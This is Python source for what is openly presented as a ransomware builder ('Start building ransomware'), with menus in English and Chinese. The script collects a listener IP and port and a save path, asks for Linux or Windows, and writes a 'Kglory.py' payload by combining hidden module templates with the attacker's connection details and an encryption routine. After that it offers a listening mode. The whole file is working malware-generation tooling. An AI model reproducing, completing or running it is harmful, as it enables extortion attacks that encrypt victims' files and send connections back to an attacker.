import os,time

def start():
    chuckedListen = main()
    return chuckedListen

def switch():
    global path
    path = {}
    while True:
        os.system("CLS")
        print("""
        Start building ransomware（开始生成勒索程序）

1.Network Configuration（网络配置）
2.Program generation path（程序生成路径）
3.Start load build（开始加载生成）
4.Back（返回）
    """)
        choose = input("\nplease input use options（请选择配置选项）:")
        if(choose == "1"):
            Networkoption = network()
            path["IP:PORT"] = Networkoption
        elif(choose == "2"):
            Pathoption = Path()
            path["savepath"] = Pathoption
        elif(choose == "3"):
            Loadoption = load(path)
            if(Loadoption):
                print("\nRansomware generation completed（勒索程序生成完毕）:"+path["savepath"]+"\\Kglory.py"+"\n")
                time.sleep(1)
                StartListen = input("Whether to enable the listening mode（是否开启监听模式）（yes/no）?:")
                return [StartListen,path["IP:PORT"]]
            else:
                print("\nPlease Set the IP address, port number, and save path.（请先配置IP地址、端口号和保存路径!）")
                time.sleep(3)
        elif(choose == "4"):
            return "Back"
        else:
            pass
def network():
    while True:
        ip = input("\nListening to the IP（监听的ip地址）:")
        port = input("\nListening to the Port（监听的端口）:")
        if(ip == "" or port == ""):
            print("\nPlease re-enter the listening IP address and port（请重新输入监听ip和端口）")
        else:
            return [ip,port]
def Path():
    while True:
        savepath = input("\nEnter the absolute path to save the file（请输入文件保存的绝对路径）:")
        if(os.path.exists(savepath)):
            if("./" in savepath or "../" in savepath):
                return os.path.abspath(savepath)
            else:
                return savepath
        else:
            print("\nPlease verify that the path really exists!（请确认路径是否真实存在!）")

def load(data):
    if(len(data) != 2):
        return False
    while True:
        Blackmail_type = input("\nRansomware generation type（勒索病毒生成类型）（linux/windows）:")
        if(Blackmail_type == "linux" or Blackmail_type == "windows"):
            break
        else:
            print("\nPlease enter the ransomware generation type correctly（请正确输入勒索病毒生成类型!）")
    if(Blackmail_type == "windows"):
        file = open(data["savepath"]+"\\Kglory.py","w+")
        hackfile = open(os.getcwd()+"\\Aop\\module.py","r+",encoding='gbk')
        hackerread = hackfile.read()
        file.write(hackerread+"global ip,port\nip=\"%s\"\nport=\"%s\""%(data["IP:PORT"][0],data["IP:PORT"][1])+"\nclientencryption = Clientencryption()\n"+"clientencryption.main()")
        file.close()
        hackfile.close()
    else:
        file = open(data["savepath"]+"\\Kglory.py","w+")
        hackfile = open(os.getcwd()+"\\Aop\\module2.py","r+",encoding='gbk')
        hackerread = hackfile.read()
        file.write(hackerread+"global ip,port\nip=\"%s\"\nport=\"%s\""%(data["IP:PORT"][0],data["IP:PORT"][1])+"\nclientencryption = Clientencryption()\n"+"clientencryption.main()")
        file.close()
        hackfile.close()
    return True
def main():
    return switch()
